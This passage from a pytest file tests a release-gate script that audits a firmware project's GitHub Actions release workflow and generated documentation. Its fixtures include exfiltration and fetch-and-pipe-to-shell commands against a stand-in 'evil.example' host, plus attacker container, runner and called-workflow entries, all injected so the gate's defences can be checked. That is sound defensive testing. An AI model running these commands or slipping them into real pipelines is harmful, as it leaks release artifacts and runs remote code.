    REF_BLOCK.replace("            exit 1\n", "          else\n            exit 1\n"),
    REF_BLOCK.replace("            exit 1\n", "").replace("          fi\n", "          fi;\n"),
    REF_BLOCK.replace("            exit 1\n",
                      "            if false; then\n              exit 1\n            fi\n"),
    REF_BLOCK.replace("exit 1", "exit 256"),
    REF_BLOCK.replace("            exit 1\n", "            {\n              exit 1\n            } | cat\n"),
    REF_BLOCK.replace("            exit 1\n", "            exit 0\n            exit 1\n"),
    REF_BLOCK.replace('            echo "refusing: this run is not at its tag" >&2\n'
                      "            exit 1\n", ""),
], ids=["gone", "only-prints", "exits-0", "inverted", "else", "fi-semicolon",
        "nested-if", "exits-256", "pipe", "exits-0-first", "empty"])
def test_a_builder_that_releases_from_another_ref_is_refused(tree, broken):
    """A run at a branch, or at tag A with `tag: B`, signs and attests as that ref,
    and the published verify commands take the release's own tag. Ways the test
    stops stopping it: deleted, a message with no exit, an exit that succeeds, the
    comparison inverted, and five a review ran past the first rule under `bash -e`:
    the exit moved to an `else`, a `fi;` that let the bound slide to the next
    block's `exit`, an inner `if false`, `exit 256` (which is 0), and the exit in a
    piped group, which `bash -e` without pipefail runs past."""
    tree.edit(WORKFLOW, REF_BLOCK, broken)
    tree.regenerate()
    assert only(tree.problems(), "does not stop a run whose ref is not the tag it releases")


def test_without_rule_6_the_builder_at_any_ref_is_not_found(tree, monkeypatch):
    """The arm, regenerated for the swapped builder's reason above."""
    gone(monkeypatch, "check_ref_is_tag")
    tree.edit(WORKFLOW, REF_BLOCK, "")
    tree.regenerate()
    assert tree.problems() == []


# --- rule 8: the page's asset names --------------------------------------------


def test_a_renamed_asset_reddens_the_page_that_still_names_the_old_one(tree):
    """The rot that already happened in this tree, in the direction it happened:
    `SHA256SUMS.cosign.bundle` -> `SHA256SUMS.sigstore.json`, with every
    published verify command left naming a file that no longer exists."""
    tree.edit(WORKFLOW, "dist/SHA256SUMS.sigstore.json", "dist/SHA256SUMS.sigstore.v2.json")
    tree.regenerate()
    problems = tree.problems()
    assert only(problems, "docs/supply-chain.md names the release asset `SHA256SUMS.sigstore.json`")
    # and the sibling page, which the rule reached only after review
    assert only(problems, "docs/releases.md names the release asset `SHA256SUMS.sigstore.json`")


def test_without_rule_8a_the_renamed_asset_is_not_found(tree, monkeypatch):
    gone(monkeypatch, "check_assets_named")
    tree.edit(WORKFLOW, "dist/SHA256SUMS.sigstore.json", "dist/SHA256SUMS.sigstore.v2.json")
    tree.regenerate()
    assert only(tree.problems(), "is not published") == []


def test_a_carve_out_the_page_no_longer_needs_is_refused(tree):
    tree.edit(PAGE, "`SHA256SUMS.cosign.bundle`", "the older name")
    tree.regenerate()
    assert only(tree.problems(), "a carve-out that outlives")


def test_the_historical_name_in_a_command_is_refused(tree):
    """The carve-out is for PROSE about five immutable releases. Inside a fenced
    block it is a command a reader copies, and pointing the page's own
    `cosign verify-blob` at the dead file was exit 0 before this half."""
    tree.edit(PAGE, "gh attestation verify rs-key-<tag>-default.uf2 --repo TheMaxMur/RS-Key",
              "cosign verify-blob --bundle SHA256SUMS.cosign.bundle SHA256SUMS")
    tree.regenerate()
    assert only(tree.problems(), "inside a fenced block")


def test_a_narrowed_upload_glob_is_refused(tree):
    """Rule 8c. What a step WRITES into `dist/` and what `gh release create`
    UPLOADS are two questions; only the first was asked, so narrowing the glob
    unpublished the checksums, the signature and the SBOM at exit 0 while this
    page went on listing all of them."""
    tree.edit(WORKFLOW, "--notes-file release-notes.md dist/*",
              "--notes-file release-notes.md dist/*.uf2")
    tree.regenerate()
    hit = only(tree.problems(), "uploads only ['dist/*.uf2']")
    assert hit and "SHA256SUMS" in hit[0]


def test_without_rule_8c_the_narrowed_glob_is_not_found(tree, monkeypatch):
    gone(monkeypatch, "check_uploaded")
    tree.edit(WORKFLOW, "--notes-file release-notes.md dist/*",
              "--notes-file release-notes.md dist/*.uf2")
    tree.regenerate()
    assert tree.problems() == []


def test_a_bare_dist_target_is_refused(tree):
    """Rule 8d: `cp "$out/$pkg.elf" dist/` keeps the source's basename, so the
    file is published, covered by no digest and named on no page — measured at
    exit 0 before this clause, with the summary still saying the same count."""
    tree.edit(WORKFLOW, '            cp "$out/$pkg.uf2" "dist/rs-key-${tag}-${label}.uf2"',
              '            cp "$out/$pkg.uf2" "dist/rs-key-${tag}-${label}.uf2"\n'
              '            cp "$out/$pkg.elf" dist/')
    tree.regenerate()
    assert only(tree.problems(), "keeps the source's basename")


def test_a_write_into_a_variable_directory_is_refused(tree):
    """The same publication through a name the bare-`dist` form never read:
    `cp "$out/$pkg.elf" "$d/"` adds fourteen unsigned ELFs to the release, and a
    rule comparing the target to the literal `dist` was exit 0 on it.
    """
    tree.edit(WORKFLOW, '            cp "$out/$pkg.uf2" "dist/rs-key-${tag}-${label}.uf2"',
              '            d=dist\n'
              '            cp "$out/$pkg.uf2" "dist/rs-key-${tag}-${label}.uf2"\n'
              '            cp "$out/$pkg.elf" "$d/"')
    tree.regenerate()
    assert only(tree.problems(), "keeps the source's basename")


def test_a_removal_is_not_a_publication(tree):
    """The other direction of the write-verb harvest, and it is not a no-op: the
    region must go on listing exactly what it listed, so `rm` reads as neither a
    finding nor an asset. Harvesting every `dist/` token instead put
    `leftover.tmp` in the published set and on the page."""
    before = published_line(tree)
    tree.edit(WORKFLOW, "          mkdir -p dist",
              "          mkdir -p dist\n          rm -f dist/leftover.tmp")
    tree.regenerate()
    assert tree.problems() == []
    assert published_line(tree) == before, "a removal was read as a publication"


def test_without_rule_8d_the_bare_target_is_not_found(tree, monkeypatch):
    gone(monkeypatch, "check_named_writes")
    tree.edit(WORKFLOW, '            cp "$out/$pkg.uf2" "dist/rs-key-${tag}-${label}.uf2"',
              '            cp "$out/$pkg.uf2" "dist/rs-key-${tag}-${label}.uf2"\n'
              '            cp "$out/$pkg.elf" dist/')
    tree.regenerate()
    assert tree.problems() == []


def test_without_rule_8b_the_stale_carve_out_is_not_found(tree, monkeypatch):
    gone(monkeypatch, "check_historical_used")
    tree.edit(PAGE, "`SHA256SUMS.cosign.bundle`", "the older name")
    tree.regenerate()
    assert only(tree.problems(), "outlives its reason") == []


# --- rule 7: nothing in the region moves with a commit -------------------------


def test_a_value_that_names_a_commit_of_this_repository_is_refused(tree):
    """A generated region carrying the tree's own revision is dirty on the next
    commit, and the row that diffs it stops being read."""
    tree.edit(WORKFLOW, "cat CHANGELOG.md > release-notes.md",
              f"cat CHANGELOG.md > release-notes.md\n          echo {tree.head()}")
    tree.regenerate()
    hit = only(tree.problems(), "names a commit of this repository")
    assert hit and tree.head() in hit[0]


def test_an_upper_case_commit_is_refused_too(tree):
    """`[0-9a-f]` was the first spelling and git resolves an UPPER-case
    abbreviation perfectly well, so a rule reading one case is a rule the other
    walks past."""
    tree.edit(WORKFLOW, "cat CHANGELOG.md > release-notes.md",
              f"cat CHANGELOG.md > release-notes.md\n          echo {tree.head().upper()}")
    tree.regenerate()
    assert only(tree.problems(), "names a commit of this repository")


def test_the_toolchain_regions_values_are_not_this_rules_business(tree):
    """[`stable`] read the whole rendered PAGE at first. A hex value in another
    generator's region is not this region's finding, and a message naming the
    wrong region is one nobody can act on."""
    tree.edit(PAGE, "## Verifying a download",
              f"<!-- other-table:start -->\n{tree.head()}\n<!-- other-table:end -->\n\n"
              "## Verifying a download")
    assert only(tree.problems(), "names a commit of this repository") == []


def test_the_action_pins_are_not_read_as_commits_of_this_repository(tree):
    """The green arm of the same rule, and the reason it asks git rather than
    matching a 40-hex shape: six of the region's own values are exactly that
    shape, and every one is another repository's."""
    assert "1111111111111111111111111111111111111111" in tree.region()
    assert tree.problems() == []


def test_without_rule_7_the_commit_valued_region_is_not_found(tree, monkeypatch):
    gone(monkeypatch, "stable")
    tree.edit(WORKFLOW, "cat CHANGELOG.md > release-notes.md",
              f"cat CHANGELOG.md > release-notes.md\n          echo {tree.head()}")
    tree.regenerate()
    assert only(tree.problems(), "names a commit of this repository") == []


# --- rule 9: the region is what the generator writes ---------------------------


def test_a_hand_edited_region_is_refused(tree):
    tree.edit(PAGE, "| `firmware-pqc` |", "| `firmware-pqc-and-more` |")
    hit = only(tree.problems(), "is not what the generator writes")
    assert hit and "--write" in hit[0]


def test_without_rule_9_the_hand_edit_stands(tree, monkeypatch):
    gone(monkeypatch, "check_region")
    tree.edit(PAGE, "| `firmware-pqc` |", "| `firmware-pqc-and-more` |")
    assert only(tree.problems(), "is not what the generator writes") == []


def test_regenerating_launders_no_clause(tree):
    """`--write` is what a developer runs on a region-diff failure, so a clause
    it silences is a clause one keystroke removes. Driven over every break that
    changes what the generator would write: after `--write` the region diff is
    gone and each of the other findings is still there."""
    tree.edit(WORKFLOW, "all 3 flavors rebuilt", "all 13 flavors rebuilt")
    tree.edit(WORKFLOW, "      - name: checksums",
              "      - run: scp dist/* mirror:/pub\n      - name: checksums")
    tree.edit(WORKFLOW, "dist/SHA256SUMS.sigstore.json", "dist/SHA256SUMS.sigstore.v2.json")
    tree.edit(WORKFLOW, REF_BLOCK, "")
    tree.regenerate()
    problems = tree.problems()
    assert only(problems, "is not what the generator writes") == []
    assert only(problems, "iterates 3 flavor(s)")
    assert only(problems, "this parser does not see")
    assert only(problems, "docs/supply-chain.md names the release asset `SHA256SUMS.sigstore.json`")
    assert only(problems, "does not stop a run whose ref is not the tag it releases")


def test_a_page_with_no_marker_pair_is_a_finding_not_a_crash(tree):
    tree.edit(PAGE, "<!-- release-manifest:end -->", "")
    assert only(tree.problems(), "needs exactly one 'release-manifest' marker pair")


# --- rule 10: the floors -------------------------------------------------------


def test_a_collapsed_entry_roster_is_refused(tree):
    assert only(tree.problems(entry_floor=99), "manifest entr(ies), under the measured 99")


def test_without_the_entry_floor_the_collapse_is_not_found(tree, monkeypatch):
    gone(monkeypatch, "check_entry_floor")
    assert only(tree.problems(entry_floor=99), "under the measured 99") == []


def test_a_collapsed_flavor_loop_is_refused(tree):
    assert only(tree.problems(flavor_floor=99), "flavor(s) read out of")


def test_without_the_flavor_floor_the_collapse_is_not_found(tree, monkeypatch):
    gone(monkeypatch, "check_flavor_floor")
    assert only(tree.problems(flavor_floor=99), "under the measured 99") == []


# --- the green arms, and neither is a no-op ------------------------------------


def test_a_fourth_flavor_added_everywhere_stays_green_and_moves_the_region(tree):
    """The control: the rules track the tree rather than pin a number. It is not
    a no-op — the region gains a row and the typed counts move with it."""
    before = tree.region()
    for old, new in (
        ("firmware firmware-pqc firmware-fips; do\n            out=",
         "firmware firmware-pqc firmware-fips firmware-display; do\n            out="),
        ("firmware firmware-pqc firmware-fips; do\n            nix build",
         "firmware firmware-pqc firmware-fips firmware-display; do\n            nix build"),
        ("build the 3 reproducible", "build the 4 reproducible"),
        ("rebuild all 3,", "rebuild all 4,"),
        ("all 3 flavors rebuilt", "all 4 flavors rebuilt"),
    ):
        tree.edit(WORKFLOW, old, new)
    tree.edit(NIX, "    firmware-fips = mkFirmware {",
              "    firmware-display = mkFirmware { name = \"firmware-display\"; };\n"
              "    firmware-fips = mkFirmware {")
    tree.edit("docs/releases.md", "Three firmware images", "Four firmware images")
    tree.regenerate()
    assert tree.problems() == []
    assert tree.region() != before
    assert "`rs-key-<tag>-display.uf2`" in tree.region()


def test_a_moved_action_pin_stays_green_and_moves_the_region(tree):
    """The second control, over the rule most likely to be over-tight: a pin is
    another repository's commit, and moving one is an ordinary dependency bump."""
    before = tree.region()
    tree.edit(WORKFLOW, "actions/cache@4444444444444444444444444444444444444444 # v6.1.0",
              "actions/cache@4444444444444444444444444444444444444445 # v6.2.0")
    tree.regenerate()
    assert tree.problems() == []
    assert tree.region() != before
    assert "4444444444444444444444444444444444444445" in tree.region()


# --- the row's own exit code ---------------------------------------------------
#
# Everything above drives `audit()` and reads its findings. The `check.sh` row
# reads neither: it reads the process's EXIT CODE. Measured on the first version
# of this table — `return 1` flipped to `return 0` in `run()` printed the finding
# to stderr and exited 0 over a tampered region, and the 76 cases here were 76
# passed either way. Deleting the whole `if findings:` block was the same, silent.
# So the row was a row that could not go red, and its table could not see it.


def mutant_run():
    """`run()` with its non-zero return flipped to zero — the defect, compiled.

    Built out of this module's own source rather than written out here, so the arm
    cannot drift from the function it is the mutation of. It also pins that there
    is exactly one such return to flip: a second one added later and left
    unasserted is the same hole again.
    """
    source = (ROOT / "scripts/release_gate.py").read_text()
    block = source[source.index("\ndef run("):source.index("\ndef main(")]
    assert block.count("return 1") == 1, "run() no longer has one non-zero exit"
    namespace = dict(vars(release_gate))
    exec(block.replace("return 1", "return 0"), namespace)  # the mutation, compiled
    return namespace["run"]


def test_a_finding_exits_nonzero_and_names_itself_on_stderr(tree, monkeypatch, capsys):
    """The direction that matters: the row goes RED, and it says why."""
    monkeypatch.setattr(release_gate, "audit", lambda *a, **k: (["a tampered region"], "ok"))
    assert release_gate.run(tree.root) == 1
    printed = capsys.readouterr()
    assert "a tampered region" in printed.err
    assert "a tampered region" not in printed.out, "a finding on stdout is not a red row"


def test_the_mutation_that_survived_this_table_is_caught_now(tree, monkeypatch):
    """The arm for the case above, in the direction the sweep measured.

    Under the mutation the finding is still printed and the exit code is still 0,
    so a case asserting only that stderr carries the text would be GREEN on the
    defect. The assertion that fails is the exit code, and this says so.
    """
    monkeypatch.setattr(release_gate, "audit", lambda *a, **k: (["a tampered region"], "ok"))
    assert mutant_run()(tree.root) == 0, "the mutation no longer describes the defect"


def test_a_clean_audit_exits_zero_and_prints_its_summary(tree, monkeypatch, capsys):
    """The other arm of the exit code, and it is not a no-op: a gate wired to
    return 1 unconditionally would pass the case above and fail this one."""
    monkeypatch.setattr(release_gate, "audit", lambda *a, **k: ([], "release-gate: ok — …"))
    assert release_gate.run(tree.root) == 0
    assert "release-gate: ok" in capsys.readouterr().out


def test_main_carries_the_exit_code_out_to_the_row(tree, monkeypatch):
    """`main()` is what `check.sh` actually enters, and it delegates — so the
    delegation is driven too, over the checkout `ROOT` the row runs on."""
    monkeypatch.setattr(release_gate, "audit", lambda *a, **k: (["a tampered region"], "ok"))
    assert release_gate.main([]) == 1
    monkeypatch.setattr(release_gate, "audit", lambda *a, **k: ([], "release-gate: ok"))
    assert release_gate.main([]) == 0


def test_an_unknown_argument_is_a_usage_error(capsys):
    """The third exit code. `--wirte` must not be read as "no argument" and run
    the audit, and `--write` is the one argument that REWRITES the page."""
    assert release_gate.main(["--wirte"]) == 2
    assert "usage" in capsys.readouterr().err


def test_the_row_this_gate_is_exits_zero_on_this_checkout():
    """The row as `check.sh` runs it, from the command line, exit code unpiped.

    `test_check_sh_runs_this_row` asserts the row's TEXT and never runs it; a
    guard is falsified through the row that runs it, not through its own function.
    """
    done = subprocess.run(
        [sys.executable, str(ROOT / "scripts/release_gate.py")],
        cwd=ROOT, capture_output=True, text=True,
    )
    assert done.returncode == 0, done.stderr
    assert done.stdout.startswith("release-gate: ok — ")


# --- rule 1d: the job's own keys -----------------------------------------------


def test_a_job_switched_off_in_place_is_refused(tree):
    """`if: false` at the JOB's indent: no step runs, and every step rule here
    reads the steps. Measured at exit 0, with the region going on printing all
    fifteen as "the steps a release runs"."""
    tree.edit(WORKFLOW, "  build:\n    runs-on:", "  build:\n    if: false\n    runs-on:")
    assert only(tree.problems(), "not one of ['permissions'")


@pytest.mark.parametrize("added", [
    "    container: attacker/img:latest",
    "    strategy:\n      matrix:\n        n: [1, 2]",
    "    continue-on-error: true",
    "    defaults:\n      run:\n        shell: python",
])
def test_a_job_key_outside_the_vocabulary_is_refused(tree, added):
    """`strategy: matrix` runs the whole job N times; `container:` runs it
    somewhere else; `continue-on-error` lets it fail; `defaults: run: shell:`
    makes every block on this page something other than bash. None of the four
    changes a command, and commands are what every other rule here reads."""
    key = added.strip().split(":")[0]
    tree.edit(WORKFLOW, "    runs-on: ubuntu-latest",
              f"    runs-on: ubuntu-latest\n{added}")
    assert only(tree.problems(), f"'{key}'")


def test_a_self_hosted_runner_is_refused(tree):
    tree.edit(WORKFLOW, "    runs-on: ubuntu-latest",
              "    runs-on: [self-hosted, attacker-box]")
    assert only(tree.problems(), "a self-hosted or containerised runner")


def test_a_widened_job_scope_is_refused(tree):
    tree.edit(WORKFLOW, "      id-token: write", "      id-token: write\n      packages: write")
    assert only(tree.problems(), "a scope no entry here opens")


def test_a_second_job_is_refused(tree):
    """A job with no `steps:` of its own is invisible to the parser-completeness
    rule, which counts `steps:` blocks — this counts the jobs."""
    tree.append(WORKFLOW, "  mirror:\n    runs-on: ubuntu-latest\n    uses: ./x.yml\n")
    assert only(tree.problems(), "carries 2 job(s)")


def test_a_blank_line_does_not_end_the_job(tree):
    """A green arm that is not a no-op: the job's keys are read by INDENT, and a
    YAML mapping may carry a blank line anywhere. Read as the end of the job, the
    parse stops before `permissions:` and the rule reports scopes the file
    plainly holds."""
    tree.edit(WORKFLOW, "    runs-on: ubuntu-latest\n    permissions:",
              "    runs-on: ubuntu-latest\n\n    permissions:")
    tree.regenerate()
    assert tree.problems() == []


def test_a_workflow_with_no_jobs_key_is_a_finding_not_a_crash(tree):
    """`jobs:` renamed away: the job reader has nothing to read, and this says so
    rather than raising out of the middle of the audit."""
    tree.edit(WORKFLOW, "jobs:\n", "jobz:\n")
    tree.regenerate()
    assert only(tree.problems(), "carries 0 job(s)")


def test_without_rule_1d_the_disarmed_job_stands(tree, monkeypatch):
    gone(monkeypatch, "check_job")
    tree.edit(WORKFLOW, "  build:\n    runs-on:", "  build:\n    if: false\n    runs-on:")
    tree.regenerate()
    assert tree.problems() == []


# --- rule 1c, widened: the shapes the first spelling walked past ----------------


def test_a_step_that_swallows_its_failure_with_a_semicolon_is_refused(tree):
    """`; true` after the rebuild, where the rule read only `|| true`."""
    tree.edit(WORKFLOW, '            nix build ".#$pkg" --rebuild --no-link',
              '            nix build ".#$pkg" --rebuild --no-link ; true')
    assert only(tree.problems(), "swallows a failure")


def test_a_step_that_swallows_its_failure_into_an_echo_is_refused(tree):
    tree.edit(WORKFLOW, '            nix build ".#$pkg" --rebuild --no-link',
              '            nix build ".#$pkg" --rebuild --no-link || echo skipped')
    assert only(tree.problems(), "swallows a failure")


def test_a_conditional_or_is_not_a_disarm(tree):
    """The green arm, and the reason [`DISARM_SUFFIX`] is a closed set: the real
    workflow's SBOM step runs `[ -e "$f" ] || continue` inside a `for`, and a rule
    reading every `||` calls the job's own control flow a swallowed failure."""
    tree.edit(WORKFLOW, "          mkdir -p dist",
              '          [ -e dist ] || continue\n          mkdir -p dist')
    tree.regenerate()
    assert tree.problems() == []
    # And that the case is not vacuous: the open form the review proposed fires.
    assert re.search(r"\|\|\s*\S", '[ -e "$f" ] || continue')
    assert not release_gate.DISARM_SUFFIX.search('[ -e "$f" ] || continue')


def test_a_step_that_turns_off_errexit_is_refused(tree):
    """The one shape a per-command rule can never see: `set +e` leaves every
    command in the block exactly as this page prints it and makes all of them
    advisory."""
    tree.edit(WORKFLOW, "          for pkg in firmware firmware-pqc firmware-fips; do\n"
                        "            nix build",
              "          set +e\n          for pkg in firmware firmware-pqc firmware-fips; do\n"
              "            nix build")
    assert only(tree.problems(), "advisory from there on")


def test_without_the_errexit_clause_the_disarmed_block_stands(tree, monkeypatch):
    monkeypatch.setattr(release_gate, "DISARM_SET", re.compile(r"(?!x)x"))
    tree.edit(WORKFLOW, "          for pkg in firmware firmware-pqc firmware-fips; do\n"
                        "            nix build",
              "          set +e\n          for pkg in firmware firmware-pqc firmware-fips; do\n"
              "            nix build")
    tree.regenerate()
    assert tree.problems() == []


def test_a_step_that_is_not_a_shell_script_is_refused(tree):
    """`shell: python` leaves the block on the page as bash and runs it as
    something else, so every command printed for that step is a mis-read."""
    tree.edit(WORKFLOW, "      - name: checksums\n        run: |",
              "      - name: checksums\n        shell: python\n        run: |")
    assert only(tree.problems(), "prints its block as bash")


def test_without_the_misread_keys_the_python_step_stands(tree, monkeypatch):
    monkeypatch.setattr(release_gate, "MISREAD_KEYS", ())
    tree.edit(WORKFLOW, "      - name: checksums\n        run: |",
              "      - name: checksums\n        shell: python\n        run: |")
    tree.regenerate()
    assert tree.problems() == []


# --- rule 1b + 6: what the CALLER runs and releases ----------------------------


def test_a_second_called_workflow_carrying_a_ref_is_refused(tree):
    """The membership form read `uses: x.yml` and never `uses: …/x.yml@v1`, so a
    second called workflow was invisible exactly when it came from elsewhere."""
    tree.append(CALLER, "  extra:\n    uses: attacker/repo/.github/workflows/evil.yml@v1\n")
    assert only(tree.problems(), "evil.yml")


def test_a_caller_that_runs_steps_of_its_own_is_refused(tree):
    """Rule 6 holds what the caller CALLS and is blind to what it RUNS."""
    tree.append(CALLER, "  extra:\n    runs-on: ubuntu-latest\n    steps:\n"
                        "      - name: exfiltrate\n        run: curl -T dist https://evil.example\n")
    assert only(tree.problems(), "a step of its own")


def test_a_widened_tag_trigger_is_refused(tree):
    tree.edit(CALLER, '    tags: ["v*"]', '    tags: ["**"]')
    assert only(tree.problems(), "the admission rule one layer above")


def test_without_the_trigger_clause_the_widened_tags_stand(tree, monkeypatch):
    monkeypatch.setattr(release_gate, "TRIGGER", '["**"]')
    tree.edit(CALLER, '    tags: ["v*"]', '    tags: ["**"]')
    tree.regenerate()
    assert tree.problems() == []


# --- rule 4e + 4f: the label rule, and a knob no name carries ------------------


def test_a_changed_label_rule_is_refused(tree):
    """The field this manifest calls derived and re-implemented instead: the
    workflow's shell renames every published asset, `label_of` does not follow,
    and the region goes on printing the old names. Measured at exit 0."""
    tree.edit(WORKFLOW, 'label="${pkg#firmware}"', 'label="rc1-${pkg#firmware}"')
    assert only(tree.problems(), "renames the published set")


def test_without_rule_4e_the_renamed_labels_stand(tree, monkeypatch):
    gone(monkeypatch, "check_label_rule")
    tree.edit(WORKFLOW, 'label="${pkg#firmware}"', 'label="rc1-${pkg#firmware}"')
    tree.regenerate()
    assert tree.problems() == []


def test_a_flavor_carrying_a_test_only_knob_is_refused(tree):
    """`fakeMkek` is a declarative derivation argument, so neither the package
    name nor its `cargoFlags` carries it — both readings `check_no_touch` has."""
    tree.edit(NIX, '    firmware-fips = mkFirmware {\n      name = "firmware-fips";',
              '    firmware-fips = mkFirmware {\n      name = "firmware-fips";\n'
              '      fakeMkek = "00";')
    assert only(tree.problems(), "TEST builds only")


def test_without_rule_4f_the_test_key_flavor_stands(tree, monkeypatch):
    gone(monkeypatch, "check_test_knobs")
    tree.edit(NIX, '    firmware-fips = mkFirmware {\n      name = "firmware-fips";',
              '    firmware-fips = mkFirmware {\n      name = "firmware-fips";\n'
              '      fakeMkek = "00";')
    tree.regenerate()
    assert tree.problems() == []


# --- rule 1f: the roster reads in the job's order ------------------------------


def test_a_reordered_step_is_refused(tree):
    """Moving `sign SHA256SUMS` above `checksums` signs a file that does not
    exist yet; every set-shaped rule here stays green on it."""
    signing = ("      - name: sign SHA256SUMS (keyless cosign)\n        run: |\n"
               "          cosign sign-blob --bundle dist/SHA256SUMS.sigstore.json dist/SHA256SUMS\n")
    tree.edit(WORKFLOW, signing, "")
    tree.edit(WORKFLOW, "      - name: checksums\n", signing + "      - name: checksums\n")
    assert only(tree.problems(), "in the job's order")


def test_without_rule_1f_the_reordered_step_stands(tree, monkeypatch):
    gone(monkeypatch, "check_entry_order")
    signing = ("      - name: sign SHA256SUMS (keyless cosign)\n        run: |\n"
               "          cosign sign-blob --bundle dist/SHA256SUMS.sigstore.json dist/SHA256SUMS\n")
    tree.edit(WORKFLOW, signing, "")
    tree.edit(WORKFLOW, "      - name: checksums\n", signing + "      - name: checksums\n")
    tree.regenerate()
    assert tree.problems() == []


# --- the comment cut, where a shell would make it ------------------------------


def mutant_steps():
    """`steps()` with its dedent terminator removed — the second `mutant_run`.

    The parser stops collecting a step's `run:` body when a line dedents to the
    steps' own level. Nothing drove that: every case that adds a second job adds
    it at an indent where the two readings agree, so the clause could be deleted
    with the table green.
    """
    source = (ROOT / "scripts/release_gate.py").read_text()
    block = source[source.index("\ndef steps("):source.index("\ndef step_items(")]
    terminator = ("        if raw.strip() and indent <= depth:\n"
                  "            current = None\n"
                  "            continue\n")
    assert block.count(terminator) == 1, "steps() no longer carries the terminator"
    namespace = dict(vars(release_gate))
    exec(block.replace(terminator, ""), namespace)  # the mutation, compiled
    return namespace["steps"]


#: A second job whose `steps:` sit at another indent, with a `run:` body indented
#: DEEPER than the first job's. Both halves matter: at another indent its items
#: are not steps, and deeper than `at` is what makes the lines readable as more of
#: the previous step's block.
LEAKING_JOB = ("  mirror:\n    steps:\n    - name: exfiltrate\n"
               "      run: |\n          curl -T dist https://evil.example\n")


def test_a_second_job_does_not_leak_into_the_last_steps_commands(tree):
    """The completeness rule counts that second `steps:` block. This is the other
    half: its deeper lines must not be read as more of the LAST step's `run:`,
    which would print a command on this page under a step that never runs it."""
    tree.append(WORKFLOW, LEAKING_JOB)
    tree.regenerate()
    assert "evil.example" not in tree.region()
    assert only(tree.problems(), "`steps:` block(s)")


def test_without_the_dedent_terminator_the_second_job_leaks(tree):
    """The arm, and the direction: without it the payload is appended to `create
    the GitHub Release`, so the page prints it as a command that step runs."""
    tree.append(WORKFLOW, LEAKING_JOB)
    job = mutant_steps()((tree.root / WORKFLOW).read_text())
    assert "evil.example" in job[-1]["block"]
    assert "evil.example" not in release_gate.steps((tree.root / WORKFLOW).read_text())[-1]["block"]


def test_a_payload_behind_a_quoted_hash_is_printed(tree):
    """The mis-read, not a residue: cut at the first ` #` whatever quotes it,
    `echo "tag # done"; curl … | sh` reads as `echo "tag` and the half that runs
    appears on this page nowhere."""
    tree.edit(WORKFLOW, "          mkdir -p dist",
              '          echo "tag # done"; curl -s https://evil.example/p | sh\n          mkdir -p dist')
    tree.regenerate()
    assert "evil.example" in tree.region()


def test_a_real_trailing_comment_is_still_cut(tree):
    """The other arm, and the reason the cut exists at all: `true # cargo …` runs
    the `true`, and the comment is not a command a release runs."""
    tree.edit(WORKFLOW, "          mkdir -p dist", "          mkdir -p dist # not a command")
    tree.regenerate()
    assert "not a command" not in tree.region()
    assert release_gate.cut_at_comment("echo 'a # b'", None) == ("echo 'a # b'", None)
    assert release_gate.cut_at_comment("awk '", None) == ("awk '", "'")
    assert release_gate.cut_at_comment("/^### x/ { print }", "'")[0] == "/^### x/ { print }"


# --- rule 3a: the frontier under another spelling -------------------------------


@pytest.mark.parametrize("spelling", ["source-to-binary", "source→binary", "miscompilation"])
def test_the_frontier_under_another_spelling_is_refused(tree, monkeypatch, spelling):
    """`FRONTIER` is one token so the claim is SAID once; comparing that one
    token is how a refusal is walked past. `source-to-binary` is the spelling
    `assurance/platform.toml` uses for the very same gap."""
    monkeypatch.setattr(release_gate, "SUBJECTS", {**release_gate.SUBJECTS, spelling: "x"})
    assert only(tree.problems(), "reachable as an entry's subject")


def test_a_gloss_rewritten_into_the_frontier_is_refused(tree, monkeypatch):
    """The third route: leave the key, rewrite what it MEANS. The rule read only
    keys, and the glosses were printed nowhere, so nothing could see it."""
    monkeypatch.setattr(release_gate, "SUBJECTS",
                        {**release_gate.SUBJECTS, "inventory": "semantic preservation of the source"})
    assert only(tree.problems(), "reachable as an entry's subject")


def test_the_glosses_are_printed_where_a_reader_can_check_them(tree):
    """The other half of that fix: a gloss nothing reads is a gloss anything can
    be written into, so all six are rendered into the byte-diffed region."""
    region = tree.region()
    for name, gloss in release_gate.SUBJECTS.items():
        assert f"| `{name}` |" in region and gloss in region


# --- rule 7: git's floor is four, not seven -------------------------------------


def test_a_six_character_commit_abbreviation_is_refused(tree):
    """`{7,40}` was justified as "git's own shortest unambiguous abbreviation".
    It is not: 7 is git's default DISPLAY width and its floor is 4, so a six-hex
    revision in a `run:` line was exit 0 and stale on the next commit."""
    # In the checksums step, which has no `for pkg in`: an abbreviation that
    # happens to be all digits is a typed count to the rule beside this one, and
    # that would redden the arm for a reason it is not about.
    tree.edit(WORKFLOW, "          cd dist",
              f"          echo built at {tree.head()[:6]}\n          cd dist")
    tree.regenerate()
    assert only(tree.problems(), "names a commit of this repository")


def test_a_short_hex_run_that_is_no_commit_stays_green(tree):
    """The widening's cost, and that it is only cost: four hex characters are
    everywhere in a release page, and none of them resolves."""
    tree.edit(WORKFLOW, "          mkdir -p dist",
              "          echo beef cafe dead\n          mkdir -p dist")
    tree.regenerate()
    assert tree.problems() == []


# --- rule 8c: the arm that had no case ------------------------------------------


def test_a_release_create_with_no_dist_operand_is_refused(tree):
    """The early return of `check_uploaded`: with no `dist/` operand this manifest
    cannot say which of the files the job wrote are published, and the rule that
    would have said so is the one being skipped."""
    tree.edit(WORKFLOW, 'gh release create "$tag" --notes-file release-notes.md dist/*',
              'gh release create "$tag" --notes-file release-notes.md')
    assert only(tree.problems(), "no `gh release create` operand under `dist/`")


def test_without_rule_8c_the_operandless_upload_is_not_found(tree, monkeypatch):
    gone(monkeypatch, "check_uploaded")
    tree.edit(WORKFLOW, 'gh release create "$tag" --notes-file release-notes.md dist/*',
              'gh release create "$tag" --notes-file release-notes.md')
    tree.regenerate()
    assert tree.problems() == []


# --- the arm for every clause added by the second review ------------------------
#
# Each is the narrow form the clause REPLACED, put back: the break stays in
# place, and the run without the clause is wholly green. An arm that deletes the
# judgement and its derivation together says which of the two found nothing.


NARROW_SUFFIX = re.compile(r"\|\|\s*(?:true|:)\s*$")
NARROW_CALLED = re.compile(r"^\s+uses:\s*(?P<path>\S+\.ya?ml)\s*$", re.M)
NARROW_HEXRUN = re.compile(r"(?<![0-9a-fA-F])[0-9a-fA-F]{7,40}(?![0-9a-fA-F])")
NARROW_UNNAMEABLE = re.compile(r"^dist/?$")
NARROW_SPELLINGS = re.compile(re.escape(release_gate.FRONTIER))


def test_without_the_widened_suffix_the_semicolon_disarm_stands(tree, monkeypatch):
    monkeypatch.setattr(release_gate, "DISARM_SUFFIX", NARROW_SUFFIX)
    tree.edit(WORKFLOW, 'nix build ".#$pkg" --rebuild --no-link',
